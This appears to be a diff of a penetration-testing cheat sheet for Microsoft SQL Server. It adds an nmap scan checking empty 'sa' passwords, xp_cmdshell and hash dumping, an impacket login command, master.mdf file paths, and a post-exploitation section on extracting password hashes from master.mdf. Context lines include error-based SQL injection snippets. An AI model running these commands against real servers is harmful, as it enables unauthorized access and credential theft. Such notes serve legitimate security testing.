@@ -2,13 +2,13 @@
 
 ## Recon
 
-```
+```bash
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 IP
 ```
 
 ## [mssqlclient.py](https://github.com/SecureAuthCorp/impacket)
 
-```
+```bash
 mssqlclient.py DOMAIN/USER:PASS@$IP [-port <>] [-windows-auth]
 ```
 
@@ -88,6 +88,15 @@ SELECT <DB>..syscolumns.name, TYPE_NAME(<DB>..syscolumns.xtype) FROM <DB>..sysco
 SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) ORDER BY name DESC
 ```
 
+## Config File Paths
+
+* https://practicalsbs.wordpress.com/2016/07/03/sql-server-file-locations-for-default-instances/
+
+```bash
+\DATA\master.mdf
+\BACKUP\master.mdf
+```
+
 ## Error-based
 
 Refer: [https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)
@@ -101,3 +110,17 @@ convert(int, @@version)--
 ## Full pwnage guide
 
 * [https://www.exploit-db.com/papers/12975](https://www.exploit-db.com/papers/12975)
+
+## .mdf extract
+
+* https://github.com/xpn/Powershell-PostExploitation
+* (known bug) https://github.com/xpn/Powershell-PostExploitation/issues/3
+
+```bash
+# fix in code
+[System.Reflection.Assembly]::UnsafeLoadFrom($PSScriptRoot + "\OrcaMDF.RawCore.dll") | Out-Null
+[System.Reflection.Assembly]::UnsafeLoadFrom($PSScriptRoot + "\OrcaMDF.Framework.dll") | Out-NUll
+
+```
+
+* https://blog.xpnsec.com/extracting-master-mdf-hashes/
